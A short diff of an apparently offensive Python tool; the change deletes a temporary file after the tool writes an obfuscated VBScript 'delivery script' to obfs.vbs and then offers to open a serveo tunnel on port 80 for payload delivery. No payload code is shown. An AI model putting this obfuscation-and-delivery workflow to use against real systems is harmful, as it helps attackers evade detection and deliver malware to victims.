@@ -131,7 +131,7 @@ def main():
 	obfs.write(randCapitalization(s)+"\n")
 	j.close()
 	obfs.close()
-	#os.remove('t')
+	os.remove('t')
 	clear()
 	input = raw_input('Delivery script obfuscated and saved as "obfs.vbs"\n\nWould you like to start a serveo server to forward port 80 for payload delivery? yes/no: ').lower()
 	if input in yes:
